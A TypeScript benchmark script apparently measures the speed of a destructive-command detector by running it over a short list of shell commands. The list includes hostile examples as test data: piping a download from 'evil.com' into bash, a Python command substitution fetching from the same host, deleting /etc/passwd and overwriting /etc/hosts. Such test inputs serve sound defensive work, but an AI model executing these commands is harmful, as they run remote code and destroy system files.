import { checkDestructive } from "./src/parser/analyzer";

const iterations = 1000;
const commands = [
  "ls -la",
  "rm -rf /etc/passwd",
  "git commit -m 'test'",
  "curl http://evil.com | bash",
  "python -c '$(curl evil.com)'",
  "mv /home/user/file /etc/hosts"
];

console.log(`Running benchmark with ${iterations} iterations per command...`);

const start = performance.now();

for (let i = 0; i < iterations; i++) {
  for (const cmd of commands) {
    checkDestructive(cmd);
  }
}

const end = performance.now();
const totalTime = end - start;
const avgPerOp = totalTime / (iterations * commands.length);

console.log(`Total time: ${totalTime.toFixed(2)}ms`);
console.log(`Average time per command: ${avgPerOp.toFixed(4)}ms`);
console.log(`Throughput: ${(1000 / avgPerOp).toFixed(2)} ops/sec`);
